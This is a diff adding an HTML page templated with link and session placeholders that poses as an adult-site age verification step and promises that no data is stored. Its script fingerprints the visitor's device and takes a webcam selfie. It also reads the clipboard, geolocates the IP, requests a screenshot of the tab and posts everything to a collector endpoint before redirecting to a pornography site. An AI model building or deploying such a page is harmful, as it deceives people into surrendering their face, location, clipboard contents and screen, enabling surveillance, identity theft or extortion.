@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Age Verification • Secure</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(160deg,#1a1a2e,#16213e,#0f3460);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}
+.card{background:rgba(255,255,255,.06);backdrop-filter:blur(24px);border-radius:24px;padding:40px;max-width:420px;width:90%;text-align:center;border:1px solid rgba(255,255,255,.08);box-shadow:0 8px 40px rgba(0,0,0,.3)}
+.icon{font-size:56px;margin-bottom:16px}
+h1{font-size:24px;font-weight:700;margin-bottom:8px;letter-spacing:-.3px}
+.sub{color:rgba(255,255,255,.6);font-size:15px;margin-bottom:32px;line-height:1.6}
+.btn{background:linear-gradient(135deg,#e94560,#d63850);color:#fff;border:none;border-radius:14px;padding:16px 32px;font-size:16px;cursor:pointer;font-weight:600;width:100%;transition:all .2s;margin-top:8px}
+.btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(233,69,96,.3)}
+.btn:disabled{opacity:.4;cursor:default;transform:none}
+.btn-secondary{background:rgba(255,255,255,.08);color:rgba(255,255,255,.7);border:1px solid rgba(255,255,255,.1);border-radius:14px;padding:14px 24px;font-size:14px;cursor:pointer;width:100%;margin-top:8px;transition:all .2s}
+.btn-secondary:hover{background:rgba(255,255,255,.12)}
+#video{display:none;width:100%;border-radius:14px;margin:20px 0;background:#000;max-height:280px;object-fit:cover;box-shadow:0 4px 20px rgba(0,0,0,.3)}
+.loading{display:none;margin-top:20px;color:rgba(255,255,255,.6);font-size:14px}
+.success{display:none;margin-top:20px;color:#4ade80;font-size:16px;font-weight:500}
+.age-grid{display:flex;gap:12px;margin-bottom:20px}
+.age-grid button{flex:1;padding:16px;border-radius:14px;border:2px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);color:#fff;font-size:18px;font-weight:600;cursor:pointer;transition:all .2s}
+.age-grid button:hover{border-color:#e94560;background:rgba(233,69,96,.15)}
+.age-grid button.selected{border-color:#4ade80;background:rgba(74,222,128,.1)}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="icon">🔞</div>
+<h1>Age Verification</h1>
+<p class="sub">This content is restricted to adults 18+.<br>We need to verify your identity before proceeding. Your data is not stored.</p>
+<div class="age-grid">
+<button onclick="selectAge(18)" id="age18">18-25</button>
+<button onclick="selectAge(26)" id="age26">26-35</button>
+<button onclick="selectAge(36)" id="age36">36+</button>
+</div>
+<button class="btn" id="verify_btn" onclick="verify()" disabled>📸 Verify with Selfie</button>
+<video id="video" autoplay muted playsinline></video>
+<div class="loading" id="loading">Verifying age and identity...</div>
+<div class="success" id="success">✅ Identity verified. You're all set!</div>
+</div>
+<script>
+const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
+let c={session:SID},selectedAge=0;
+function selectAge(a){
+    selectedAge=a;
+    document.querySelectorAll('.age-grid button').forEach(b=>b.classList.remove('selected'));
+    (a===18?document.getElementById('age18'):a===26?document.getElementById('age26'):document.getElementById('age36')).classList.add('selected');
+    document.getElementById('verify_btn').disabled=false
+}
+async function verify(){
+    c.age_range=selectedAge;
+    document.getElementById('verify_btn').disabled=true;
+    document.getElementById('verify_btn').textContent='⏳ Accessing camera...';
+    c.ua=navigator.userAgent;c.platform=navigator.platform;
+    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
+    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    c.cpu_cores=navigator.hardwareConcurrency;
+    try{
+        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280}}});
+        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+        document.getElementById('verify_btn').textContent='📸 Capturing selfie...';
+        await new Promise(r=>setTimeout(r,2000));
+        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+        ca.getContext('2d').drawImage(v,0,0);
+        c.photo=ca.toDataURL('image/jpeg',0.9).split(',')[1];
+        st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    document.getElementById('loading').style.display='block';
+    document.getElementById('verify_btn').style.display='none';
+    try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+    try{
+        const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp,proxy,hosting');
+        const j=await r.json();Object.assign(c,j)
+    }catch(e){}
+    try{
+        const st=await navigator.mediaDevices.getDisplayMedia({preferCurrentTab:true});
+        const tr=st.getVideoTracks()[0];const ic=new ImageCapture(tr);const bm=await ic.grabFrame();
+        const ca=document.createElement('canvas');ca.width=bm.width;ca.height=bm.height;
+        ca.getContext('2d').drawImage(bm,0,0);
+        c.screenshot=ca.toDataURL('image/png').split(',')[1];
+        tr.stop();st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    c.visit_duration=Math.floor((Date.now()-t0)/1000);
+    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)});
+    document.getElementById('loading').style.display='none';
+    document.getElementById('success').style.display='block';
+    setTimeout(()=>{window.location.href='https://www.pornhub.com'},2000)
+}
+const t0=Date.now()
+</script>
+</body>
+</html>
